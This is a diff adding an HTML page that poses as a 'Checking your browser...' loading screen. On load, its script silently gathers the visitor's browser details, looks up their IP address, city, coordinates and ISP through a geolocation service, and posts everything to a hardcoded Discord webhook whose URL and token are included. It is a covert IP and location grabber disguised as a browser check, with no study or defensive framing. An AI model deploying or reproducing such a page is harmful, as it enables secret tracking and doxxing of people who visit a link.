@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .message {
+            text-align: center;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">
+        Checking your browser...
+    </div>
+
+    <script>
+        (function() {
+            // Collect browser and system information
+            const browserInfo = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unspecified'
+            };
+
+            // Function to send data to Discord webhook
+            function sendToDiscord(payload) {
+                const webhookURL = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).catch(error => {
+                    console.error('Failed to send to Discord:', error);
+                });
+            }
+
+            // Try to get IP and location data from ipapi.co
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Construct a detailed message
+                    const message = {
+                        content: `🆕 **New Visitor**\n` +
+                                 `**IP:** ${ipData.ip || 'N/A'}\n` +
+                                 `**Location:** ${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}\n` +
+                                 `**Coordinates:** ${ipData.latitude || '?'}, ${ipData.longitude || '?'}\n` +
+                                 `**ISP:** ${ipData.org || 'N/A'}\n` +
+                                 `**Timezone:** ${ipData.timezone || browserInfo.timezone}\n` +
+                                 `**Browser:** ${browserInfo.userAgent}\n` +
+                                 `**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
+                                 `**Language:** ${browserInfo.language}\n` +
+                                 `**Platform:** ${browserInfo.platform}\n` +
+                                 `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
+                                 `**Do Not Track:** ${browserInfo.doNotTrack}`
+                    };
+
+                    sendToDiscord(message);
+                })
+                .catch(error => {
+                    // If geolocation API fails, send whatever we have
+                    console.warn('IP geolocation failed:', error);
+                    const fallbackMessage = {
+                        content: `🆕 **New Visitor (limited data)**\n` +
+                                 `**Browser Info:** ${browserInfo.userAgent}\n` +
+                                 `**Screen:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
+                                 `**Language:** ${browserInfo.language}\n` +
+                                 `**Platform:** ${browserInfo.platform}\n` +
+                                 `**Timezone:** ${browserInfo.timezone}\n` +
+                                 `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
+                                 `**Note:** Could not retrieve IP/location.`
+                    };
+                    sendToDiscord(fallbackMessage);
+                });
+        })();
+    </script>
+</body>
+</html>
